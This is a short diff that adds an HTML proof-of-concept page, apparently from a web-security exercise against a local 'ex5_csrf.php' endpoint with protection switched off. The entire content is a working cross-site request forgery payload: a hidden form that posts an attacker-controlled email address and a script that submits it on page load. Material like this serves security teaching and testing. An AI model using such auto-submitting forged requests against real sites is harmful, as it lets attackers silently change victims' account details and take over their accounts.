@@ -1,0 +1,6 @@
+<form action="http://localhost:8000/ex5_csrf.php?secure=0" method="post">
+  <input type="hidden" name="email" value="attacker@evil.tld" />
+  <script>
+    document.forms[0].submit();
+  </script>
+</form>
